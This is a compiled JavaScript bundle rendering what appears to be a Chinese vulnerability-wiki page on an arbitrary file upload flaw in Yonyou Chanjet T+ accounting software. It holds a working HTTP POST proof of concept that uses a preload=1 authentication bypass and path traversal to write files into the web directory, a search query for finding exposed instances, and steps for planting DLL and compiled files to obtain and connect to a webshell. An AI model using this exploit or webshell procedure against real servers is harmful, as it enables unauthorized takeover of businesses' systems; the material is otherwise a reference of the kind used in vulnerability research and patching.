(window.webpackJsonp=window.webpackJsonp||[]).push([[50],{2295:function(a,s,t){a.exports=t.p+"assets/img/1662017510454-8bb328d0-35ee-42f9-a36a-625e95a5cfc2-2353804.d2e14fae.png"},2296:function(a,s,t){a.exports=t.p+"assets/img/1662034256298-447ab241-2def-46e0-a97d-9dae60549044.09fbccf4.png"},2297:function(a,s,t){a.exports=t.p+"assets/img/1662034644623-835164ab-e259-41ab-9999-2a5ef462a462.1cabf801.png"},2298:function(a,s,t){a.exports=t.p+"assets/img/1662037558563-ffb9835f-fc57-4d45-bc08-dfdf5cb2892d.ef126ae3.png"},2299:function(a,s,t){a.exports=t.p+"assets/img/1662037573454-3bc3ef0c-3ff2-46b6-b90a-ef3c72150be2.8031c988.png"},2300:function(a,s,t){a.exports=t.p+"assets/img/1662037605211-d44eed98-a1e1-4bac-85be-bb2909844f68.8263ea5d.png"},2980:function(a,s,t){"use strict";t.r(s);var e=t(75),n=Object(e.a)({},(function(){var a=this,s=a.$createElement,e=a._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[e("h1",{attrs:{id:"用友-畅捷通t-upload-aspx-任意文件上传漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#用友-畅捷通t-upload-aspx-任意文件上传漏洞"}},[a._v("#")]),a._v(" 用友 畅捷通T+ Upload.aspx 任意文件上传漏洞")]),a._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),e("p",[a._v("用友 畅捷通T+ Upload.aspx接口存在任意文件上传漏洞，攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器")]),a._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),e("a-checkbox",{attrs:{checked:""}},[a._v("用友 畅捷通T+")]),e("br"),a._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),e("a-checkbox",{attrs:{checked:""}},[a._v('app="畅捷通-TPlus"')]),e("br"),a._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),e("p",[a._v("登录页面")]),a._v(" "),e("p",[e("img",{attrs:{src:t(2295),alt:"img"}})]),a._v(" "),e("p",[a._v("存在漏洞的接口为 /tplus/SM/SetupAccount/Upload.aspx , 对应文件 App_Web_upload.aspx.9475d17f.dll")]),a._v(" "),e("p",[e("img",{attrs:{src:t(2296),alt:"img"}})]),a._v(" "),e("p",[a._v("上传文件类型验证不完善，可上传任意文件到服务器中的任意位置，验证POC")]),a._v(" "),e("div",{staticClass:"language-html line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-html"}},[e("code",[a._v('POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1\nHost:\nAccept: */*\nAccept-Encoding: gzip, deflate\nContent-Length: 261\nUser-Agent: Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ko-KR) AppleWebKit/535.16.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.16.4\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXR9biLu\nConnection: close\n\n------WebKitFormBoundaryVXR9biLu\nContent-Disposition: form-data; name="File1";filename="../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/1.txt"\nContent-Type: image/jpeg\n\n1\n------WebKitFormBoundaryVXR9biLu--\n')])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br"),e("span",{staticClass:"line-number"},[a._v("2")]),e("br"),e("span",{staticClass:"line-number"},[a._v("3")]),e("br"),e("span",{staticClass:"line-number"},[a._v("4")]),e("br"),e("span",{staticClass:"line-number"},[a._v("5")]),e("br"),e("span",{staticClass:"line-number"},[a._v("6")]),e("br"),e("span",{staticClass:"line-number"},[a._v("7")]),e("br"),e("span",{staticClass:"line-number"},[a._v("8")]),e("br"),e("span",{staticClass:"line-number"},[a._v("9")]),e("br"),e("span",{staticClass:"line-number"},[a._v("10")]),e("br"),e("span",{staticClass:"line-number"},[a._v("11")]),e("br"),e("span",{staticClass:"line-number"},[a._v("12")]),e("br"),e("span",{staticClass:"line-number"},[a._v("13")]),e("br"),e("span",{staticClass:"line-number"},[a._v("14")]),e("br"),e("span",{staticClass:"line-number"},[a._v("15")]),e("br")])]),e("p",[a._v("由于应用为预编译的，直接上传的 aspx木马无法直接利用，需要通过上传 dll 与 compiled 文件后利用Webshell")]),a._v(" "),e("p",[e("img",{attrs:{src:t(2297),alt:"img"}})]),a._v(" "),e("p",[a._v("将 dll 与 compiled 文件上传至 Web应用的 bin目录上，aspx上传至 Web根目录下")]),a._v(" "),e("p",[e("img",{attrs:{src:t(2298),alt:"img"}})]),a._v(" "),e("p",[e("img",{attrs:{src:t(2299),alt:"img"}})]),a._v(" "),e("p",[e("img",{attrs:{src:t(2300),alt:"img"}})]),a._v(" "),e("p",[a._v("再访问写入的Webshell进行连接")]),a._v(" "),e("div",{staticClass:"language-html line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-html"}},[e("code",[a._v("/tplus/shell.aspx?preload=1\t\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])])],1)}),[],!1,null,null,null);s.default=n.exports}}]);